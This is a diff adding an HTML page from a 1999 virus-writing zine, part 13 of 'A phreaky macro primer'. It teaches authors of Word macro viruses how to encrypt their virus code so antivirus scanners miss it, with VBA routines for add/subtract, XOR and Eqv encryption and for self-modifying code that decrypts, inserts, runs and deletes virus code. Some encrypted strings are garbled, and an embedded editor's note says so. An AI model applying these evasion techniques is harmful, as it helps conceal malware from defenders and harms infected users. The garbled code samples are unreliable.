@@ -1,0 +1,307 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - A Phreaky Macro Primer 0.1 - Encryption in macro</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote> 
+  <PRE><b>
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=
+                                                      ?    ?    ?        
+                                                        ?  ____  
+                                                          /    \ ?
+      A phreaky macro primer v0.1                     ?  / \ _  \  ?
+      .by jackie / Metaphase                            ( .o o.  ) ___
+                                                      __/   ^    \/   \
+                                                     /  \___o____      \
+=-=[ Encryption ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</b>
+
+     .Introduction to encryption
+     .Encryption technics
+     .Using Encryption
+                               
+   [ Music ]
+  
+     .Machine Head .The burning red
+     .Life of Agony .Ugly     
+     .Nirvana .Unplugged in New York
+
+<b><font color="#FF0000">(NOTE By Cicatrix:&quot;Some of the code used in this tutorial was 
+written in ASCII and does not translate to HTML correctly. Please 
+refer to the LZO #2 zine for the correct version)</font></b>
+<b>
+.Introduction to Encryption</b>
+
+    Hi kids,  welcome to the  encryption part of my guide.  Well encryption
+for your macro is a nice way to protect your virus against detection.  It's
+my favourite one. ; ) So you may now think about how we can encrypt our bug
+to make it unscannable?  Well,  we do not encrypt our bits like in good asm
+viruses but  we can encrypt  our commands to hide it from AV scanners.  Ok,
+first a bit of theory in encryption, that you understand what I mean. If we
+take the string  'Hello'  and change it's characters to the next following,
+then our string would be 'Ifmmp'.  Well this is just a very very simple and
+very lame technic, but it does it's work. So just get in your mind that our
+encryption will  always be  based on character exchanging.  For this we can
+use different logical operator which I will explain later. I also found two
+nice technics  which do not use these operators  but encrypt the code fine.
+For the  encryption with the logical operators,  we always have to define a
+key. This key encrypt/decrypts our code. If this key remains the same every
+infection we can call it basic encryption but if the key changes every inf-
+ection, we call it polymorphic encryption.  ; )  As you now may  can think,
+the second one, encryption with different keys, is the better one.  Ok, now
+we gonna  take a look on some different  methods we can use to  encrypt our
+code.
+
+
+<b>.Encryption technics</b>
+
+ .Add/Substract method
+
+    Here I will explain you some encryption technics you can use to encrypt
+your macro bug. Ok, first I will start with the simple and easy ones, where
+we add/substract a number from ascii value of each sign. Similar to add/sub
+in asm! ; ). I will now give you an example of this and see the use in your
+macro at the next section.  For our example I take the string stored in the
+variable and add 23 to each ascii sign.
+
+ OldString = "This is a test!"
+
+ For i = 1 To Len(OldString)
+  NewString = NewString & Chr(Asc(Mid(OldString, i, 1)) + 23)
+ Next
+
+    After this the encrypted string 'NewString' would be 'kÄä7Ää7x7ã|äã8'.
+The problem with this is,  that we have to use a different encryption & de-
+cryption routine,  because to decrypt our string again we have to substract
+23 from the ascii signs. Well, no problem with the following routine.
+
+ OldString = "kÄä7Ää7x7ã|äã8"
+
+ For i = 1 To Len(OldString)
+  NewString = NewString & Chr(Asc(Mid(OldString, i, 1)) - 23)
+ Next
+
+    This routine would  decrypt our string again to  'This is a test!' . Of
+course  you can  use higher numbers to  add or substract,  but keep in mind
+that the  highest number of ascii signs is 255.  If you get higher than 255
+your code will crash.  You can also first substract  a number to encrypt it
+and the add a number to decrypt it again, well it is your decision.
+
+    This technics are asymmetric encryptions, because you can't use the en-
+cryption routine as a decryption routine.
+
+
+ .XOR method
+
+    Well, why 'famous'? Hmm...it is the basic encryption a normal asm virus
+uses. A short example how XOR works. If we take two numbers, 5 and 3 and
+use both with XOR we get as result 6. A little graphic will explain.
+
+                  5  XOR  3             =             6
+           00000101  XOR  00000011      =      00000110
+
+    Ok, the XOR operator uses binary to compare the two operands, so I show
+it also with binary.  As you know or not in binary we only have 0 and 1. So
+XOR looks for  each bit of the two  operands and if it is equal it makes it
+different.  If you take our example,  the zero bit in both is 1 so the zero
+bit in the result will be 0. First bit is in both different so it takes the
+higher, 1.  The second bit is again different so it takes again the 1.  Our
+result is now 00000110 which is 6 in decimal. Well are you confused? Ok, if
+yes then  I will bring now more confusion  in your head.  So what if we use
+XOR  on result with one of  the two operands we used first ?  Do you have a
+clue?  Well here is the example
+
+                  6  XOR  3             =             5
+           00000110  XOR  00000011      =      00000101
+
+    As you see,  XOR takes again each bit of the  two operands and compares
+it. The zero bit is different so in our result byte the zero bit will be 1.
+First bit is equal so XOR makes it 0 and last second bit is different so it
+is 1. If we translate it back to decimal, our result is 5. If this confuses
+you too much,  hehehe,  don't care now,  you will need it when you start to
+code real viruses in ASM.  For now you can use this command without knowing
+what it really does ;P. So, now an example for VBA.
+
+ OurString = "This is a test!"
+
+ For i = 1 To Len(OurString)
+  NewAscii = NewAscii & Chr(Asc(Mid(OurString, i, 1)) Xor 23)
+ Next
+
+    The encrypted string in 'NewAscii' would now be 'C~d7~d7v7crdc6'.  The
+very good on XOR is that we can use this  routine to decrypt the string ag-
+ain. As you see, our key is again '23'.  Of course you can change this key,
+but remember that you have to decrypt  code you encrypted with the same key
+again. Otherwise your code will be destroyed. I have here a little table to
+get this XOR on you.
+
+       Bit in      Bit in
+      Operand1    Operand2    Result 
+     .-------------------------------.
+     |    0     |    0     |    0    |
+     |    0     |    1     |    1    |
+     |    1     |    0     |    1    |
+     |    1     |    1     |    0    |
+     `-------------------------------¥
+
+ .Equivalent method
+
+    You may wonder why use equivalent of something to encrypt, yah it works
+pretty fine.  Eqv does exact the difference to Xor, just take a look on the
+little cheesy graphic I did, to see what I mean. (You love my cheesy graph-
+ics,  don't you?)  And by the way, I was the first  who used this tech in a
+macro bug.  Eqv performs a logical equivalence on two expressions.  Same as
+our beloved Xor command, Eqv performs a bitwise comparison.
+
+        Bit in      Bit in  
+       Operand1    Operand2   Result
+     .-------------------------------.
+     |    0     |    0     |    1    |
+     |    0     |    1     |    0    |
+     |    1     |    0     |    0    |
+     |    1     |    1     |    1    |
+     `-------------------------------¥
+
+    Well, as you see it does the opposite to XOR and finds the equivalent
+of the bit we are comparing. So I am not gonna say more to this.
+
+ OurString = "This is a test!"
+
+ For i = 1 To Len(OurString)
+  temp1 = Asc(Mid(OurString, i))
+  temp2 = temp1 Eqv 153 * -1
+  NewAscii = NewAscii & Chr(temp2)
+ Next
+
+    As a result, we would get 'ÃÒÎ∏ÒÎ∏˘∏Ï˝ÎÏπ' in our variable 'NewAscii'.
+Well, let me explain this routine a bit. First of all we need to get a sin-
+gle ascii value  into our variable temp1.  Then we use this value  with the
+logical operator 'Eqv'.  'Eqv' would return a negative value so we multiply
+it with -1, after that normal method to get a character back. Ok, this will
+work also backwards,  so if you replace the value of OurString with the one
+you got in NewAscii  you will see the original string again.  For a working
+example of this technic check Class.Equivalent, you can find it in the app-
+endix.
+
+    The Xor and the Eqv encryption technics use the same encryption and de-
+cryption routine. This is called symmetric encryption. Of course you can be
+so kind and use multiple layer encryption. I used it in one of my bugs, but
+I don't remember in what. X-D Ok, I am sure I already said too much, so for
+sure there are more logical operators you can use for encryption but I just
+give you here the basic ones. I hope you could understand what they do. Now
+we will take a look on the  basic use of these technics in your macro bugs.
+
+
+<b>.Using Encryption</b>
+
+    Ok, basically we use two technics for encryption in your macro bug. The
+first one is to store all encrypted code in arrays, the first Word 97 macro
+which used encryption was W97M.Optiz written by me. The source was included
+in LineZer0 Network Zine #1.  It used arrays to store the code. Well, now a
+little sceme how it works.
+
+
+  .---------------------.  Well, may it sounds a bit confusing to you, but
+  | A sub that contains |  it isn't. Ok, a bit. If we take Optiz, it tries
+  | encrypted code in   |  to encrypt  the code stored in arrays,  inserts
+  | arrays and a call   |  it into an empty sub,  executes it and  deletes
+  | for crypt function  |  it afterwards.
+  .---------------------.
+  | An empty sub were   |  In this sub the code gets inserted.
+  | you can insert the  |
+  | decrypted code      |
+  .---------------------.
+  |   Crypt function    |  This function decrypts the encrypted code.
+  `---------------------¥
+
+    Let me show you  now some source code.  It is the just a  basic example
+how this could work in your macro virus.
+
+
+ OurCode(0) = "lã=bèèåè=oÇê'äÇ=kÇï'"
+ OurCode(1) = "pÇ'=^Ä'Ü"Ç|=Z=^Ä'Ü"ÇaåÄ'äÇã'Ks_mèåáÇÄ'Ks_`åäçåãÇã'ê"
+ OurCode(2) = "pÇ'=kåèä~â|=Z=kåèä~âqÇäçâ~'ÇKs_mèåáÇÄ'Ks_`åäçåãÇã'ê"
+
+ For y = 0 To 2
+  VirusCode = VirusCode & Crypt(OurCode(y)) & VbCr
+ Next
+ 
+ ...InsertLines 29, VirusCode
+
+ [Execute code]
+ 
+ ...DeleteLines 29, 3
+
+ -
+
+ Private Function Crypt(OldString)
+  For i = 1 To Len(OldString)
+   Crypt = Crypt & Chr(Asc(Mid(OldString, i, 1)) + 29)
+  Next
+ End Function
+
+
+    What you see here is the technic which Optiz uses. This is just an exa-
+mple and you should use another one or not, whatever. So now to a more com-
+mon technic. Let me first explain a bit and then show some graphics. Ok, we
+gonna see here the common method. A sub, mainly a hook sub, contains a call
+for the crypt function that en/decrypts the code. After this call, it calls
+the sub that has the en/decrypted  code inside and executes the viral code.
+
+
+  .--------------------.   This sub, mostly a trigger sub, calls the de-
+  |  A sub that calls  |   cryption  function and after that a  call for 
+  |  a crypt function  |   the sub that  contains the en/decrypted code.
+  .--------------------.
+  | A sub that has the |   This sub holds  the en/decrypted code inside.
+  | encrypted code in- |   The main virus code.
+  | side.              |
+  .--------------------.
+  |   Crypt function   |   This  function  decrypts the encrypted  code.
+  `--------------------¥
+
+
+  For y = 20 To 22
+   ThisDocument.VBProject.VBComponents(1).CodeModule.ReplaceLine _
+    y, Crypt(Mid(ThisDocument.VBProject.VBComponents(1).CodeModule _
+    .Lines(y, 1), 2), CryptKey)
+  Next
+
+  [Execute Code]
+
+  Private Function Crypt(What, CryptKey)
+   For x = 1 To Len(What)
+    Crypt = Crypt & Chr(Asc(Mid(What, x, 1)) Xor CryptKey)
+   Next
+  End Function
+  
+    The sub with the code we need to call, would look like that.
+
+ Private Sub VirusCode()
+ '»Èß¬ııËıß’‚ÙÚÍ‚ß…‚ˇÛ
+ '»˜ÛÓËÈÙ©‘ÊÒ‚…ËıÍÊÎ◊ıËÍ˜Ûß∫ßØ’È„ßß∑Æ
+ 'Œ·ß∆˜˜ÎÓ‰ÊÛÓËÈ©—‚ıÙÓËÈß∫ß•æ©∑•ß”Ô‚È
+ End Sub
+
+<b><font color="#FF0000">(NOTE By Cicatrix:&quot;The above was written in ASCII and does not 
+translate to HTML correctly. Please refer to the LZO #2 zine for 
+the correct version)</font></b><font color="#FF0000">
+</font>
+    This sub 'VirusCode' must contain a routine that encrypts the code just
+at the beginning of execution of the viral code, so that we can have to al-
+ready new encrypted code stored into a variable. Well, it sounds a bit con-
+fusing, but if you take a look at the source codes in the appendix, you may
+notice that it is damn easy, or not. ;)
+
+    Ok, that's for now all I have to say about encryption,  if you still do
+not understand something re read it again and again, once you have the clue
+you will see it's easy.  If you still have problems with this feel free and
+mail me. In that sence, happy encryption.
+
+
+                              -End Of Part#13-
+
+<b>=-=[EOF]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[LineZer0 Network 99]=-=</b>
+</PRE>
+</blockquote>
+</BODY>
+</HTML>
